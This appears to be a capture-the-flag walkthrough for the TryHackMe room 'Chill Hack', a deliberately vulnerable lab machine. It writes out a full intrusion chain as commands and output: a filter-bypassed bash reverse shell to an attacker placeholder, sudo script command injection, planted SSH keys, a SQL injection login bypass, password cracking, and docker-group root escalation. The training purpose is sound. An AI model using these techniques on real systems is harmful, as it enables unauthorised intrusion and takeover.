# [Chill Hack](https://tryhackme.com/room/chillhack)

# Investigate!

## Chill the Hack out of the Machine. Easy level CTF. Capture the flags and have fun!

### User Flag

1. Start by scanning the target machine to identify open ports and running services:

```bash
nmap -sV -p- <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

2. Check if anonymous FTP access is allowed:

```bash
ftp <TARGET_IP>
anonymous
ls -la
get note.txt
```

**note.txt**

```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

3. Perform directory brute-forcing on the web server to discover hidden directories:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Results:**

```
/images               (Status: 301) [Size: 313] [--> http://<TARGET_IP>/images/]
/css                  (Status: 301) [Size: 310] [--> http://<TARGET_IP>/css/]
/js                   (Status: 301) [Size: 309] [--> http://<TARGET_IP>/js/]
/fonts                (Status: 301) [Size: 312] [--> http://<TARGET_IP>/fonts/]
/secret               (Status: 301) [Size: 313] [--> http://<TARGET_IP>/secret/]
/server-status        (Status: 403) [Size: 277]
```

4. Navigate to `http://<TARGET_IP>/secret/` in your browser. You'll find a command execution interface with input filtering. The application filters certain characters, but we can bypass this using various techniques like `l\s`, `'l's` or `l""s`

5. On your attacking machine, set up a netcat listener to catch the reverse shell:

```bash
nc -lvnp 4444
```

6. In the command input field at `http://<TARGET_IP>/secret/`, execute a reverse shell using the filter bypass technique:

```bash
b\ash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

7. Check what commands can be run with sudo:

```bash
sudo -l
```

**Results:**

```
User www-data may run the following commands on ip-10-81-165-69:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

8. Examine the script to identify potential vulnerabilities:

```bash
cat /home/apaar/.helpline.sh
```

**.helpline.sh**

```bash
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

The script executes the `$msg` variable without sanitization, allowing command injection.

9. Run the script as **apaar** and inject `/bin/bash` as the message to get a shell:

```bash
sudo -u apaar /home/apaar/.helpline.sh
test
/bin/bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

[SCREEN01]

10. Navigate to apaar's home directory and read the user flag:

```bash
cd /home/apaar
cat local.txt
```

[SCREEN02]

---

### Root Flag

1. Check for services listening on localhost that might not be accessible externally:

```bash
ss -tulpn
```

**Results:**

```
Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process
udp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*
udp   UNCONN 0      0       <TARGET_IP>%eth0:68           0.0.0.0:*
tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*
tcp   LISTEN 0      511             127.0.0.1:9001         0.0.0.0:*
tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*
tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*
tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*
tcp   LISTEN 0      511                     *:80                 *:*
tcp   LISTEN 0      128                  [::]:22              [::]:*
tcp   LISTEN 0      32                      *:21                 *:*
```

Port **9001** is listening on localhost only - this is likely running a web service we need to investigate.

2. To enable SSH port forwarding, generate an SSH key pair on your attacking machine:

```bash
ssh-keygen -t rsa -b 4096 -f ./id_rsa
```

3. Copy your public key content and add it to apaar's authorized_keys to enable SSH login:

```bash
echo "your-public-key-content" >> /home/apaar/.ssh/authorized_keys
```

Replace `your-public-key-content` with the content of `id_rsa.pub` from your attacking machine.

4. Use SSH local port forwarding to access the service running on port 9001:

```bash
ssh -i id_rsa -L 9001:localhost:9001 apaar@<TARGET_IP>
```

5. Open your browser and visit `http://127.0.0.1:9001/`. You'll find a login page.

Exploit SQL injection to bypass authentication:

- **Username:** `' OR 1=1-- -`
- **Password:** `' OR 1=1-- -`

6. After logging in, navigate to `http://127.0.0.1:9001/hacker.php` and download the image file `hacker-with-laptop_23-2147985341.jpg`.

7. Use stegseek to extract hidden data from the image using the rockyou wordlist:

```bash
stegseek hacker-with-laptop_23-2147985341.jpg
```

8. The extracted file is a ZIP archive. Rename it and crack the password:

```bash
mv hacker-with-laptop_23-2147985341.jpg.out backup.zip
zip2john backup.zip > hash
john -w=/usr/share/wordlists/rockyou.txt hash
```

9. Inside the ZIP archive, you'll find `source_code.php` containing a base64-encoded password. Switch to the **anurodh** user:

```bash
su anurodh
# Decoded password !d0ntKn0wmYp@ssw0rd
```

10. Check the user's group memberships:

```bash
id
```

**Results:**

```
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

The user **anurodh** is a member of the **docker** group, which can be exploited for privilege escalation.

11. Exploit docker group membership to escalate to root by mounting the host filesystem:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

12. Navigate to the root directory and read the final flag:

```bash
cat /root/proof.txt
```

[SCREEN03]
